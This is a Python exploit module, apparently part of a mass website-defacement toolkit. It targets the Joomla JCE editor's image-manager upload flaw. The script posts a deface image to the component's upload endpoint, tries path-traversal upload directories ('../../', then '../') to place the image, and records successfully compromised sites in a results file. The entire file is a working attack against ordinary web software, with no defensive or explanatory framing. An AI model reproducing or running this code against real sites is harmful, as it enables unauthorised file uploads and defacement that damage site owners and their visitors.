# coding=utf-8
import requests
import printModule


Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Jce_Deface_image = 'files/vuln.gif'

def Exploit(site):
    try:
        fileDeface = {'Filedata': open(Jce_Deface_image, 'rb')}
        post_data = {'upload-dir': '../../', 'upload-overwrite': '0', 'action': 'upload'}
        Exp = 'http://' + site + \
              '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form'
        Post = requests.post(Exp, files=fileDeface, data=post_data, timeout=5, headers=Headers)
        OtherMethod = '"text":"' + Jce_Deface_image.split('/')[1] + '"'
        if OtherMethod in str(Post.content):
            with open('result/Index_results.txt', 'a') as writer:
                writer.write(site + '/' + Jce_Deface_image.split('/')[1] + '\n')
            return printModule.returnYes(site, 'N/A', 'Com_JCE', 'Joomla')
        elif OtherMethod not in str(Post.content):
            post_data2 = {'upload-dir': '../', 'upload-overwrite': '0', 'action': 'upload'}
            Post = requests.post(Exp, files=fileDeface, data=post_data2, timeout=5, headers=Headers)
            if OtherMethod in str(Post.content):
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(site + '/images/' + Jce_Deface_image.split('/')[1] + '\n')
                return printModule.returnYes(site, 'N/A', 'Com_JCE Index', 'Joomla')
            else:
                return printModule.returnNo(site, 'N/A', 'Com_JCE Index', 'Joomla')
        else:
            return printModule.returnNo(site, 'N/A', 'Com_JCE Index', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_JCE Index', 'Joomla')
